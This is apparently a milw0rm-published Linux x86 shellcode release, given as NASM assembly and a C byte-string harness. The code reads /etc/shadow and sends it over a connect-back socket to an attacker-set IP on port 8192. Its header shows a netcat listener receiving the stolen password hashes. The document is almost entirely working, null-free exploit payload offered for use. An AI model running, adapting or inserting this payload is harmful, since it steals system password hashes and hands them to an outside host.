;                           (C)oDed by 0in
;                   Dark-Coders Group Productions
;        [Linux x86 connect back&send&exit /etc/shadow 155 byte shellcode]
;   >>>>>>>>>>>>>>>>>>>> www.dark-coders.pl <<<<<<<<<<<<<<<<<<<<<<
;               Contact: 0in[dot]email[at]gmail[dot]com
;           Greetings to:die_Angel,suN8Hclf,m4r1usz,cOndemned
; Compile:
;       nasm -f elf shellcode.asm
;       ld -o shellcode shellcode.o
; How it works!?
; (1st console) [root@13world]# ./shellcode
; (2nd console) 0in[~]%> nc -v -l -p 8192
; (2nd console)
;Connection from 127.0.0.1:48820
;root:[password here]:13896::::::
;bin:x:0::::::
;daemon:x:0::::::
;mail:x:0::::::
;ftp:x:0::::::
;nobody:x:0::::::
;dbus:!:13716:0:99999:7:::
;zer0in:[password here]:13716:0:99999:7:::
;avahi:!:13716:0:99999:7:::
;hal:!:13716:0:99999:7:::
;clamav:!:13735:0:99999:7:::
;fetchmail:!:13737:0:99999:7:::
;mysql:!:12072:0:99999:7:::
;postfix:!:13798:0:99999:7:::
;mpd:!:13828:0:99999:7:::
;nginx:!:13959:0:99999:7:::
;tomcat:!:14063:0:99999:7:::
;http:!:14075:0:99999:7:::
;snort:!:14075:0:99999:7:::

;The code (Assembler version):

Section .text
    global _start

_start:
          ;open(file,O_RDONLY):
        xor ebx,ebx
        push byte 0x77 ;/etc/shadow
        push word 0x6f64
        push 0x6168732f
        push 0x6374652f; ----------
        mov ebx,esp ; first arg - filename
        xor ax,ax
        inc ax
        inc ax
        inc ax
        inc ax
        inc ax ; ax = 5 (O_RDONLY)
        int 0x80
        mov ebx,eax
        ;read(file,buff,1222):
        xor ax,ax
        inc ax
        inc ax
        inc ax ; syscall id = 3
        mov dx,1222 ; size to read
        push esp
        mov ecx,[esp] ; memory
        int 0x80
        mov esi,eax ; file to ESI
        ;socket(PF_INET,SOCK_STREAM,IPPROTO_IP)
        xor ebx,ebx
        push ebx ;0 ; 3rd arg
        inc ebx
        push ebx ;1 ; 2nd arg
        inc ebx
        push ebx ;2 ; 1st arg
                    ;socketcall()
        mov ax,1666 ;--------------
        sub ax,1564 ;--------------
        xor bx,bx   ; socket() call id
        inc bx      ;- - - - - - - - -
        mov ecx,esp ; socket()
        int 0x80    ; do it!
        pop ebx; clear mem
        ;connect(eax,struct server,16)
                  ;16 - sizeof struct sockaddr
        mov edx, eax
        xor ebx,ebx
        xor ebx,ebx  ; ebx = 0 - IP=0.0.0.0 (set EBX to ur IP)
        push ebx
        mov bx,1666 ; definition of struct sockaddr
        sub bx,1634 ;we cant stay 0x00 here (8192 PORT)
        push bx
        mov al, 2 ;
        push ax
        mov ecx, esp
        mov al, 16
        push eax
        push ecx
        push edx
        mov al, 102
        mov bx,1666
        sub bx,1663 ;---------------------------------
        mov ecx, esp
        int 0x80 ; call connect
        mov ebx,eax ; socket to ebx
        ; Ok! so...
        ; Lets write file to server and go down!
        ;write(socket,file,1222)
        pop ebx
        mov ax,1666
        sub ax,1662
        push esi
        mov dx,16666
        sub dx,15444
        int 0x80
        ;exit(1) :
        xor eax,eax ;----------
        inc eax
        mov ebx,eax ;----------
        int 0x80    ; do it!
;C:
;   #include <stdio.h>
;   char shellcode[]="\x31\xdb"
;   "\x6a\x77"
;   "\x66\x68\x64\x6f"
;   "\x68\x2f\x73\x68\x61"
;   "\x68\x2f\x65\x74\x63"
;   "\x89\xe3"
;   "\x66\x31\xc0"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\x40"
;   "\xcd\x80"
;   "\x89\xc3"
;   "\x66\x31\xc0"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\xba\xc6\x04"
;   "\x54"
;   "\x8b\x0c\x24"
;   "\xcd\x80"
;   "\x89\xc6"
;   "\x31\xdb"
;   "\x53"
;   "\x43"
;   "\x53"
;   "\x43"
;   "\x53"
;   "\x66\xb8\x82\x06"
;   "\x66\x2d\x1c\x06"
;   "\x66\x31\xdb"
;   "\x66\x43"
;   "\x89\xe1"
;   "\xcd\x80"
;   "\x5b"
;   "\x89\xc2"
;   "\x31\xdb"
;   "\x53"
;   "\x66\xbb\x82\x06"
;   "\x66\x81\xeb\x62\x06"
;   "\x66\x53"
;   "\xb0\x02"
;   "\x66\x50"
;   "\x89\xe1"
;   "\xb0\x10"
;   "\x50"
;   "\x51"
;   "\x52"
;   "\xb0\x66"
;   "\x66\xbb\x82\x06"
;   "\x66\x81\xeb\x7f\x06"
;   "\x89\xe1"
;   "\xcd\x80"
;   "\x89\xc3"
;   "\x5b"
;   "\x66\xb8\x82\x06"
;   "\x66\x2d\x7e\x06"
;   "\x56"
;   "\x66\xba\x1a\x41"
;   "\x66\x81\xea\x54\x3c"
;   "\xcd\x80"
;   "\x31\xc0"
;   "\x40"
;   "\x89\xc3"
;   "\xcd\x80";
;   int main(int argc, char **argv)
;    {
;	    int *ret;
;	    ret = (int *)&ret + 2;
;	    (*ret) = (int) shellcode;
;    }

; milw0rm.com [2008-08-18]